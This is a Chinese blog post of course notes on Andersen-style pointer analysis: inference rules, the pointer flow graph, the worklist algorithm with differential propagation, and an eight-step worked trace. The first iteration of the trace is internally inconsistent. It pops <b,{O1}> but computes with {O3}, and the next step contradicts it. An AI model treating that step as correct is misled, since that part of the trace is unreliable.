          <a href="#相关概念定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关概念定义" class="headerlink" title="相关概念定义"></a>相关概念定义</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105649355.png" alt="image-20230114105649355"></p>
<p><code>pt</code>就相当于一个<code>map</code>，<code>key-&gt;value</code>。<code>pt(p)</code>即变量<code>p</code>指向的对象的集合，比如<code>x = new T()</code>，则<code>pt(x)</code>就代表<code>x</code>指向的对象集合，因为我们用的是<code>Flow Insentivity</code>这个技术，所以是<code>pt(x)</code>是一个集合。</p>

        <h2 id="1-Rules"   >
          <a href="#1-Rules" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Rules" class="headerlink" title="1.Rules"></a>1.Rules</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111049511.png" alt="image-20230114111049511"></p>
<p>即横线上面的为前提条件<code>premises</code>，当前提条件满足，则可以推导出结论<code>conclusion</code>。</p>

        <h3 id="Rule-New"   >
          <a href="#Rule-New" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-New" class="headerlink" title="Rule : New"></a>Rule : New</h3>
      <p>无条件得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111610469.png" alt="image-20230114111610469"></p>

        <h3 id="Rule-Assign"   >
          <a href="#Rule-Assign" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Assign" class="headerlink" title="Rule : Assign"></a>Rule : Assign</h3>
      <p>比如一条语句为<code>x=y</code>，如果<code>premises</code>满足<code>O𝑖 ∈ pt(y)</code>，那么即可推导出<code>conclusion</code>为<code>O𝑖 ∈ pt(x)</code>，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111313810.png" alt="image-20230114111313810"></p>
<p>即将<code>pt(y)</code>集合中的对象<code>Oi</code>加入到<code>pt(x)</code>这个集合中</p>

        <h3 id="Rule-Store"   >
          <a href="#Rule-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Store" class="headerlink" title="Rule : Store"></a>Rule : Store</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111644983.png" alt="image-20230114111644983"></p>
<p>需要理解一个<code>pt(Oi*f)</code>的含义，即某个<strong>对象成员</strong>指向的<strong>对象</strong>的合集。</p>

        <h3 id="Rule-Load"   >
          <a href="#Rule-Load" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Load" class="headerlink" title="Rule : Load"></a>Rule : Load</h3>
      <p>和前面差不多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111859758.png" alt="image-20230114111859758"></p>

        <h3 id="总结-2"   >
          <a href="#总结-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114112036216.png" alt="image-20230114112036216"></p>
<p>其实就是形式化表达了这些语句，方便后续推导</p>

        <h2 id="2-How-to-Implement-Pointer-Analysis"   >
          <a href="#2-How-to-Implement-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-How-to-Implement-Pointer-Analysis" class="headerlink" title="2.How to Implement Pointer Analysis"></a>2.How to Implement Pointer Analysis</h2>
      <p>指针分析关键点就是如果在一个指针发生变化时，如何将变化传递给和该指针有关的其他指针。</p>
<p>使用图来传播指针，传输给该指针的后继。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114142437257.png" alt="image-20230114142437257"></p>

        <h3 id="Pointer-Flow-Graph-PFG"   >
          <a href="#Pointer-Flow-Graph-PFG" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Flow-Graph-PFG" class="headerlink" title="Pointer Flow Graph(PFG)"></a>Pointer Flow Graph(PFG)</h3>
      
        <h4 id="概念"   >
          <a href="#概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念" class="headerlink" title="概念"></a>概念</h4>
      <ul>
<li><p><code>Nodes</code></p>
<p><code>Pointer = V ⋃ (O × F)</code>，即节点<code>n</code>表示一个指针变量，或者说一个抽象对象的一个<code>field</code>。</p>
</li>
<li><p><code>Edges</code></p>
<p><code>Pointer × Pointer</code>，某条边<code>x-&gt;y</code>，代表<code>x</code>指向的对象<code>pt(x)</code>也**可能<code>may</code>**会流向<code>y</code>指向的对象<code>pt(y)</code>。</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114143412980.png" alt="image-20230114143412980"></p>
<p>节点<code>n</code>即相关的变量，边<code>edge</code>即流向关系。</p>

        <h4 id="实例-1"   >
          <a href="#实例-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4>
      <p>如下图所示，感觉还是挺清楚的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114144100365.png" alt="image-20230114144100365"></p>
<p>需要注意的是，<code>c.f</code>需要表示成<code>Oi.f</code>才行，才是一个真正的指针。</p>
<p>那么指针分析就变成在指针图<code>PFG</code>上分析指针集传播过程的问题了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114150729422.png" alt="image-20230114150729422"></p>

        <h3 id="Propagate-points-to-information-on-PFG"   >
          <a href="#Propagate-points-to-information-on-PFG" class="heading-link"><i class="fas fa-link"></i></a><a href="#Propagate-points-to-information-on-PFG" class="headerlink" title="Propagate points-to information on PFG"></a>Propagate points-to information on PFG</h3>
      <p>在上述建图的过程中，其实也涉及到指针传播的相关信息，并不是说在建立<code>PFG</code>时不考虑传播信息。比如说在构建<code>c.f=a</code>时，我们需要先知道的是<code>c</code>的指针流向，即<code>Oi</code>。传播和构建是相辅相成的，动态构建的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114152258172.png" alt="image-20230114152258172"></p>

        <h2 id="3-Pointer-Analysis-Algorithms"   >
          <a href="#3-Pointer-Analysis-Algorithms" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Pointer-Analysis-Algorithms" class="headerlink" title="3.Pointer Analysis: Algorithms"></a>3.Pointer Analysis: Algorithms</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114153245606.png" alt="image-20230114153245606"></p>
<p>其中<code>S</code>即为输入程序语句的合集，<code>PFG</code>就是指针流向图，比较需要关注的就是<code>WL</code>以及其中的数据含义</p>
<ul>
<li><p><code>Worklist</code></p>
<p>存储需要被处理的<code>pair</code>，其中每个<code>pair</code>形式大概为<code>&lt;n,pts&gt;</code>，代表说<code>pts</code>这个对象集合需要被传播到指针<code>n</code>指向的对象集合<code>pt(n)</code>中。</p>
<p>比如一个<code>Worklist</code>为<code>[&lt;x,&#123;Oi&#125;&gt;,&lt;y,&#123;Oj,Ok&#125;&gt;,&lt;Oj.f,&#123;Ol&#125;...&gt;</code>，表示</p>
<ul>
<li><code>&#123;Oi&#125;</code>需要传播到<code>pt(x)</code></li>
<li><code>&#123;Oj,Ok&#125;</code>需要传播到<code>pt(y)</code></li>
<li><code>&#123;Ol&#125;</code>需要传播到<code>pt(Oj.f)</code></li>
<li>…..</li>
</ul>
</li>
</ul>

        <h3 id="Handling-of-New-and-Assign"   >
          <a href="#Handling-of-New-and-Assign" class="heading-link"><i class="fas fa-link"></i></a><a href="#Handling-of-New-and-Assign" class="headerlink" title="Handling of New and Assign"></a>Handling of New and Assign</h3>
      <p>算法的前部分是用来处理<code>New</code>和<code>Assign</code>的</p>

        <h4 id="Initialize"   >
          <a href="#Initialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#Initialize" class="headerlink" title="Initialize"></a>Initialize</h4>
      <p>首先进行相关的初始化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114155802247.png" alt="image-20230114155802247"></p>
<p>遍历所有<code>New</code>和<code>Assign</code>语句</p>
<ul>
<li><p><code>New</code>语句即将相关<code>pair</code>添加到<code>WL</code>中</p>
</li>
<li><p><code>Assign</code>即需要在<code>PFG</code>中添加相关传播关系的边<code>edge</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114155946021.png" alt="image-20230114155946021"></p>
<ul>
<li>如果<code>s-&gt;t</code>这条边在<code>edge</code>中存在则说明有边了，不需要添加了，否则就添加到<code>PFG</code>中</li>
<li>添加完成之后，还需要判断<code>pt(s)</code>是不是空的，如果不是空的则需要将对应<code>pt(s)</code>传播到<code>t</code>指向的对象集中，所以需要将它加入到<code>WL</code>进行后续分析工作</li>
</ul>
</li>
</ul>

        <h4 id="Propagate"   >
          <a href="#Propagate" class="heading-link"><i class="fas fa-link"></i></a><a href="#Propagate" class="headerlink" title="Propagate"></a>Propagate</h4>
      <p>在初始化之后，就需要遍历<code>WL</code>进行传播了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114160853754.png" alt="image-20230114160853754"></p>
<ul>
<li><p>首先从<code>WL</code>中取出</p>
</li>
<li><p>在<code>pts</code>中找到<code>pt(n)</code>中不存在的对象集<code>Δ</code>，因为在<code>pts</code>中存在的对象，在<code>pt(n)</code>中也可能存在，所以需要去掉之后再进行合并操作，避免重复。相关例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114161127326.png" alt="image-20230114161127326"></p>
<p>注：最开始其实所有指针的对象集<code>pt(x)</code>都是空的，那么为什么需要去重呢，这个后面会讲到。应该是在动态的创建<code>PFG</code>过程中，<code>pt(x)</code>会不断更新，也会重复被计算。如果不去重的话，其后继中已经被传播的部分就可能再次被传播，从而做了无用功，影响效率。</p>
</li>
<li><p>然后就是传播<code>Propagate(n,Δ)</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114161246125.png" alt="image-20230114161246125"></p>
<ul>
<li>如果<code>pts</code>不为空，就并入到<code>pt(n)</code>中，这个就是实际的传播过去了。</li>
<li>但是传播到<code>pt(n)</code>不够，还需要传播到<code>n</code>可以流向的其他所有节点。所以需要遍历<code>PFG</code>中所有的<code>n-&gt;s</code>，将<code>&lt;s,pts&gt;</code>加入到<code>WL</code>中等待后续处理</li>
</ul>
</li>
</ul>

        <h5 id="Differential-Propagation"   >
          <a href="#Differential-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Differential-Propagation" class="headerlink" title="Differential Propagation"></a>Differential Propagation</h5>
      <p>这里就是解释了为什么需要差异传播<code>Differential Propagation</code>去重，即避免已经被传播过的信息再被传播造成无用功。</p>
<p>比如如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104011048.png" alt="image-20230116104011048"></p>
<p>假设<code>a</code>先传播，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104038107.png" alt="image-20230116104038107"></p>
<p>那么<code>b</code>再进行传播，此时<code>c</code>就相当于<code>n</code>，那么<code>pts=&#123;O1,O3,O5&#125;</code>，<code>pt(n)=&#123;O1,O2,O3&#125;</code>，如果不进行差异传播则过程如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104446528.png" alt="image-20230116104446528"></p>
<p>导致<code>&#123;O1,O3&#125;</code>被重复传播</p>
<p>如果进行差异传播则过程如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104520952.png" alt="image-20230116104520952"></p>
<p>这样已经被传播过的就不会再被进行计算传播了。</p>
<p>不过这里有个前提，即该算法在每次传播的时候已经确保了<code>pt(n)</code>已经被传播给了<code>n</code>的所有后继。</p>

        <h3 id="Handling-of-Store-and-Load"   >
          <a href="#Handling-of-Store-and-Load" class="heading-link"><i class="fas fa-link"></i></a><a href="#Handling-of-Store-and-Load" class="headerlink" title="Handling of Store and Load"></a>Handling of Store and Load</h3>
      <p>算法循环的后半部分是用来处理<code>Store</code>和<code>Load</code>的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116112641178.png" alt="image-20230116112641178"></p>
<p>关于<code>x</code>指向对象相关成员的所有<code>Store</code>和<code>Load</code>语句都会进行处理，需要遍历所有需要传播的对象集合，即<code>Δ</code></p>
<p>这里需要注意的是，再添加边时，不一定能够添加上。因为在处理<code>x.f=y</code>时，之前可能已经有了<code>A=x;A.f=y</code>这样的，导致在<code>PFG</code>中其实有了这样一条边，就不用再添加了。这也是在<code>AddEdge</code>中进行是否存在边判断的原因。</p>

        <h3 id="实例-2"   >
          <a href="#实例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114337394.png" alt="image-20230116114337394"></p>
<p>首先初始化<code>WL=[]、PFG=&#123;&#125;</code></p>

        <h4 id="New处理"   >
          <a href="#New处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#New处理" class="headerlink" title="New处理"></a>New处理</h4>
      <p>首先是<code>New</code>处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114833417.png" alt="image-20230116114833417"></p>
<p>语句1和3有<code>New</code>操作，对应<code>O1</code>和<code>O3</code>，添加到<code>WL</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116115029573.png" alt="image-20230116115029573"></p>

        <h4 id="Assign处理"   >
          <a href="#Assign处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#Assign处理" class="headerlink" title="Assign处理"></a>Assign处理</h4>
      <p>然后是<code>Assign</code>处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114849027.png" alt="image-20230116114849027"></p>
<p>语句2和5有<code>Assign</code>操作，进行<code>AddEdge</code>操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114926158.png" alt="image-20230116114926158"></p>
<p>使得<code>PFG</code>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116115004261.png" alt="image-20230116115004261"></p>
<p>由于还没进行传播操作，所以这里<code>b</code>对应的<code>pt(b)</code>和<code>c</code>对应的<code>pt(c)</code>还是空的。</p>
<p>那么在以上两种初始化操作完成后，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116115127433.png" alt="image-20230116115127433"></p>

        <h4 id="WL处理"   >
          <a href="#WL处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#WL处理" class="headerlink" title="WL处理"></a>WL处理</h4>
      <p><code>Load</code>和<code>Store</code>是在这一部分进行迭代的</p>

        <h5 id="第一次迭代-3"   >
          <a href="#第一次迭代-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-3" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;b,&#123;O1&#125;&gt;,&lt;c,&#123;O3&#125;&gt;];</span><br><span class="line">n = b;</span><br><span class="line">WL = [&lt;c,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(b) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	b-&gt;a ∈ PFG;</span><br><span class="line">	WL += &lt;a,pts&gt;; =&gt; WL = [&lt;c,&#123;O3&#125;&gt;,&lt;a,&#123;O3&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于b的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116120125591.png" alt="image-20230116120125591"></p>

        <h5 id="第二次迭代-3"   >
          <a href="#第二次迭代-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-3" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;c,&#123;03&#125;&gt;,&lt;a,&#123;O1&#125;&gt;];</span><br><span class="line">n = c;</span><br><span class="line">WL = [&lt;a,&#123;O1&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(c) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	c-&gt;d ∈ PFG;</span><br><span class="line">	WL += &lt;d,pts&gt;; =&gt; WL = [&lt;a,&#123;O1&#125;&gt;,&lt;d,&#123;O3&#125;&gt;];</span><br><span class="line"></span><br><span class="line">Load and Store:</span><br><span class="line">	c.f存在相关语句</span><br><span class="line">	O3 ∈ Δ = &#123;O3&#125;;</span><br><span class="line">	c.f = a:</span><br><span class="line">		a-&gt;c.f = a-&gt;O3.f ∉ PFG;</span><br><span class="line">		PFG += a-&gt;O3.f;</span><br><span class="line">		pt(a)=&#123;&#125;;</span><br><span class="line">	c.f = d:</span><br><span class="line">		d-&gt;c.f = d-&gt;O3.f ∉ PFG;</span><br><span class="line">		PFG += d-&gt;O3.f;</span><br><span class="line">		pt(d)=&#123;&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116121324230.png" alt="image-20230116121324230"></p>

        <h5 id="第三次迭代-2"   >
          <a href="#第三次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-2" class="headerlink" title="第三次迭代"></a>第三次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;a,&#123;O1&#125;&gt;,&lt;d,&#123;O3&#125;&gt;];</span><br><span class="line">n = a;</span><br><span class="line">WL = [&lt;d,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O1&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O1&#125; - &#123;&#125; = &#123;O1&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O1&#125;;</span><br><span class="line">	pt(a) = pt(n) = pts ⋃ pt(n) = &#123;O1&#125; ⋃ &#123;&#125; = &#123;O1&#125;;</span><br><span class="line">	a-&gt;O3.f ∈ PFG;</span><br><span class="line">	WL += &lt;O3.f,pts&gt;; =&gt; WL = [&lt;d,&#123;O3&#125;&gt;,&lt;O3.f,&#123;O1&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116123211552.png" alt="image-20230116123211552"></p>

        <h5 id="第四次迭代"   >
          <a href="#第四次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次迭代" class="headerlink" title="第四次迭代"></a>第四次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;d,&#123;O3&#125;&gt;,&lt;O3.f,&#123;O1&#125;&gt;];</span><br><span class="line">n = d;</span><br><span class="line">WL = [&lt;O3.f,&#123;O1&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(d) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	d-&gt;O3.f ∈ PFG;</span><br><span class="line">	WL += &lt;O3.f,pts&gt;; =&gt; WL = [&lt;O3.f,&#123;O1&#125;&gt;,&lt;O3.f,&#123;O3&#125;&gt;];</span><br><span class="line">	</span><br><span class="line">Load and Store:</span><br><span class="line">	d.f存在相关语句</span><br><span class="line">	O3 ∈ Δ = &#123;O3&#125;;</span><br><span class="line">	e = d.f:</span><br><span class="line">		d.f-&gt;e = O3.f-&gt;e ∉ PFG;</span><br><span class="line">		PFG += O3.f-&gt;e;</span><br><span class="line">		pt(O3.f) = &#123;&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116123300983.png" alt="image-20230116123300983"></p>

        <h5 id="第五次迭代"   >
          <a href="#第五次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五次迭代" class="headerlink" title="第五次迭代"></a>第五次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;O3.f,&#123;O1&#125;&gt;,&lt;O3.f,&#123;O3&#125;&gt;];</span><br><span class="line">n = O3.f;</span><br><span class="line">WL = [&lt;O3.f,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O1&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O1&#125; - &#123;&#125; = &#123;O1&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O1&#125;;</span><br><span class="line">	pt(O3.f) = pt(n) = pts ⋃ pt(n) = &#123;O1&#125; ⋃ &#123;&#125; = &#123;O1&#125;;</span><br><span class="line">	O3.f-&gt;e ∈ PFG;</span><br><span class="line">	WL += &lt;e,pts&gt;; =&gt; WL = [&lt;O3.f,&#123;O3&#125;&gt;,&lt;e,&#123;O1&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于O3.f的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116140630003.png" alt="image-20230116140630003"></p>

        <h5 id="第六次迭代"   >
          <a href="#第六次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六次迭代" class="headerlink" title="第六次迭代"></a>第六次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;O3.f,&#123;O3&#125;&gt;,&lt;e,&#123;O1&#125;&gt;];</span><br><span class="line">n = O3.f;</span><br><span class="line">WL = [&lt;e,&#123;O1&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;O1&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(O3.f) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;O1&#125; = &#123;O1,O3&#125;;</span><br><span class="line">	O3.f-&gt;e ∈ PFG;</span><br><span class="line">	WL += &lt;e,pts&gt;; =&gt; WL = [&lt;e,&#123;O1&#125;&gt;,&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于O3.f的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116140900865.png" alt="image-20230116140900865"></p>

        <h5 id="第七次迭代"   >
          <a href="#第七次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七次迭代" class="headerlink" title="第七次迭代"></a>第七次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;e,&#123;O1&#125;&gt;,&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line">n = e;</span><br><span class="line">WL = [&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O1&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O1&#125; - &#123;&#125; = &#123;O1&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O1&#125;;</span><br><span class="line">	pt(e) = pt(n) = pts ⋃ pt(n) = &#123;O1&#125; ⋃ &#123;&#125; = &#123;O1&#125;;</span><br><span class="line">	e没有后继</span><br><span class="line"></span><br><span class="line">关于e的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>


        <h5 id="第八次迭代"   >
          <a href="#第八次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第八次迭代" class="headerlink" title="第八次迭代"></a>第八次迭代</h5>
      <p>和第七次类似</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line">n = e;</span><br><span class="line">WL = [];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;O1&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(e) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;O1&#125; = &#123;O1,O3&#125;;</span><br><span class="line">	e没有后继</span><br><span class="line"></span><br><span class="line">关于e的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p><code>WL</code>为空，算法结束，最终结果为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116141524281.png" alt="image-20230116141524281"></p>

        <h2 id="总结-3"   >
          <a href="#总结-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116142223691.png" alt="image-20230116142223691"></p>
<p>理解指针分析的规则，<code>PFG</code>，以及对应的算法</p>

        <h1 id="九、Pointer-Analysis-Foundations-II"   >
          <a href="#九、Pointer-Analysis-Foundations-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、Pointer-Analysis-Foundations-II" class="headerlink" title="九、Pointer Analysis Foundations (II)"></a>九、Pointer Analysis Foundations (II)</h1>
      
        <h2 id="4-Pointer-Analysis-with-Method-Calls"   >
